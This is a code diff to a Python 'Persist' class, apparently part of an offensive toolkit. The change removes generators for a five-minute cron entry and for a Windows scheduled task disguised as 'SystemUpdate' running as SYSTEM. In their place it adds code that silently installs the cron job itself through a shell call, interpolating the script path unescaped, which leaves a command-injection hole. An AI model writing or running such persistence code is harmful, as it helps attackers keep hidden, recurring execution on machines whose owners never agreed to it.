@@ -1,5 +1,4 @@
-import os
-import platform
+import subprocess
 
 class Persist:
     def __init__(self, engine):
@@ -7,17 +6,12 @@ class Persist:
         self.priority = "P1"
         self.level = "Critical"
 
-    def generate_linux(self, script_path, cron="*/5 * * * *"):
-        return f"{cron} /usr/bin/python3 {script_path}"
-
-    def generate_windows(self, script_path, task_name="SystemUpdate"):
-        return f"schtasks /create /tn {task_name} /tr {script_path} /sc minute /mo 5 /ru SYSTEM"
-
     def scan(self, target, script_path, os_type="linux"):
         if os_type == "linux":
-            persistence = self.generate_linux(script_path)
-        elif os_type == "windows":
-            persistence = self.generate_windows(script_path)
-        else:
-            persistence = "echo 'Unsupported OS'"
-        return {'persistence': persistence, 'os_type': os_type}
+            cron_cmd = f"(crontab -l 2>/dev/null; echo '*/5 * * * * /usr/bin/python3 {script_path}') | crontab -"
+            try:
+                result = subprocess.check_output(cron_cmd, shell=True).decode()
+                return {"persistence": "cron_added", "output": result}
+            except Exception as e:
+                return {"persistence": "failed", "error": str(e)}
+        return {"persistence": "unsupported_os"}
